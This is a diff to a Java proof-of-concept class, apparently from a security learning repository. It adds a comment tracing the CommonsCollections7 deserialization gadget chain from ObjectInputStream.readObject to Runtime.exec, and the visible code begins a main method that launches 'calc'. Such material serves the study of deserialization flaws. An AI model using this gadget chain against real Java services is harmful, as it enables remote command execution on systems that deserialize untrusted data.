@@ -12,6 +12,32 @@ import java.util.AbstractMap;
 import java.util.HashMap;
 import java.util.Hashtable;
 import java.util.Map;
+
+/**
+ * exec:347, Runtime (java.lang)
+ * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+ * invoke:62, NativeMethodAccessorImpl (sun.reflect)
+ * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+ * invoke:497, Method (java.lang.reflect)
+ * transform:126, InvokerTransformer (org.apache.commons.collections.functors)
+ * transform:123, ChainedTransformer (org.apache.commons.collections.functors)
+ * get:158, LazyMap (org.apache.commons.collections.map)
+ * equals:472, AbstractMap (java.util)
+ * equals:130, AbstractMapDecorator (org.apache.commons.collections.map)
+ * reconstitutionPut:1221, Hashtable (java.util)
+ * readObject:1195, Hashtable (java.util)
+ * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+ * invoke:62, NativeMethodAccessorImpl (sun.reflect)
+ * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+ * invoke:497, Method (java.lang.reflect)
+ * invokeReadObject:1058, ObjectStreamClass (java.io)
+ * readSerialData:1900, ObjectInputStream (java.io)
+ * readOrdinaryObject:1801, ObjectInputStream (java.io)
+ * readObject0:1351, ObjectInputStream (java.io)
+ * readObject:371, ObjectInputStream (java.io)
+ * base64deserial:59, SerializeUtils (com.javasec.utils)
+ * main:45, CommonsCollections7 (com.javasec.pocs.cc)
+ */
 public class CommonsCollections7 {
     public static void main(String[] args) throws Exception {
         final String[] execArgs = new String[]{"calc"};
